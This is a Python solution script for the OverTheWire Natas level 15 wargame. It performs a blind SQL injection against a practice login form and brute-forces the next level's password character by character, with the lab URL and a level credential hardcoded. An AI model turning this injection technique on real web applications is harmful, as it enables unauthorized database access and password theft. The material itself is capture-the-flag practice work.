#!/usr/bin/env python

import requests
from bs4 import BeautifulSoup
import string


class natas15():
    def __init__(self, url, user, password):
        self.url = url
        self.user = user
        self.password = password

    def blind_sql_injection(self, query):
        """
        Returns true if query returns one or more rows
        False if query return empty result
        """
        request = requests.post(self.url, auth=(self.user, self.password),
                                data={'username': self.generate_injection(query)})
        content = BeautifulSoup(request.text, "lxml").find(id='content').text
        return self.check_result(content)

    @staticmethod
    def generate_injection(query):
        print('Execurting query: %s' % query)
        return 'natas16" and ' + query + ' and password !="'

    @staticmethod
    def check_result(content):
        return 'This user exists' in content

    def get_password_length(self, max_length=50):
        print("Determing password length")
        for length in range(1, max_length):
            if self.blind_sql_injection("password like '%s'" % ('_' * length)):
                print ('Password length: %i' % length)
                break

        return length

    def get_alphabet(self):
        """ Shrink possible chars pool """
        alphabet = ''
        for char in string.printable:
            if self.blind_sql_injection("password regexp '.*[%s].*'" % char):
                alphabet += char
        return alphabet

    def brute_password(self):
        password = ''
        length = self.get_password_length()
        alphabet = self.get_alphabet()

        print("""Bruteforcing password with parameters:
                 Length: %i
                 Alphabet: %s""" % (length, alphabet))

        for _ in range(length):
            for char in alphabet:
                if self.blind_sql_injection("password like binary '%s%%'" % (password + char)):
                    password += char
                    break
        return password


crack = natas15(url='http://natas15.natas.labs.overthewire.org/index.php',
                user='natas15',
                password='AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
print "Password: %s" % crack.brute_password()
